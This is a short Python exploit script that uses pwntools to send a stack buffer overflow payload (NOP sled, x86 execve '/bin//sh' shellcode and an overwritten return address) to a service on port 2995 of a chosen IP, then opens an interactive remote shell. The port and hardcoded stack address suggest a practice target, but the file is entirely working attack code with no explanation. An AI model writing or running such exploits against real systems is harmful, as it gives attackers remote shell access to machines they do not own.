#!/usr/bin/env python

import re
from pwn import *

offset = 520
stackAddr = 0xbffffac0
def conn(ipAddr):
    sc = asm('xor ecx,ecx;mul ecx; push ecx; push 0x68732f2f ; push 0x6e69622f ; mov ebx, esp; mov al, 11; int 0x80')
    s = remote(ipAddr, 2995)
    payload = "A"*11 + "\x00" + "\x90"*(offset-len(sc)-100)
    payload += sc
    payload += "B"*100
    payload += p32(stackAddr)
    s.send(payload + "\n")
    s.interactive()
    s.close()

if len(sys.argv) < 2:
    print("usage: %s <ipAddr>")

else:
    conn(sys.argv[1])
